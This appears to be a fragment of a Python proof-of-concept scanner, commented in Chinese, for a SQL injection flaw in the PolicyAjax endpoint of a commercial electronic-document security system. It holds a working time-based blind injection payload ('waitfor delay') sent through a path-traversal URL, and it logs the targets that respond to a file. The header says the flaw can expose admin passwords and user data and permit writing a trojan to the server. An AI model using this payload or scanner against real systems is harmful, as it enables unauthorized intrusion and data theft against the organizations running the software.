...
# 漏洞概述:某赛通电子文档安全管理系统PolicyAjax接口处存在sql注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
...
def banner():
    test = """ 
                ...
                \x1b[33m   ╚═╝   ╚══════╝       ╚═════╝╚═════╝  ╚═════╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    --author:Kucei  --Version:某赛通电子文档安全管理系统 PolicyAjax SQL注入漏洞
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)
...
def main():
    banner()
    parser = argparse.ArgumentParser('某赛通电子文档安全管理系统 PolicyAjax SQL注入漏洞')
...
def poc(target):
    url_payload = "/CDGServer3/dojojs/../PolicyAjax"
    headers = {
    ...
    data = "command=selectOption&id=1';waitfor+delay+'0:0:5'--"
    try :
        ...
        if response.status_code == 200 and time > 5:
            print( f"[+] {target} 存在漏洞！\n")
            with open('YS-CDG_PolicyAjax-SQL.txt','a',encoding='utf-8')as f:
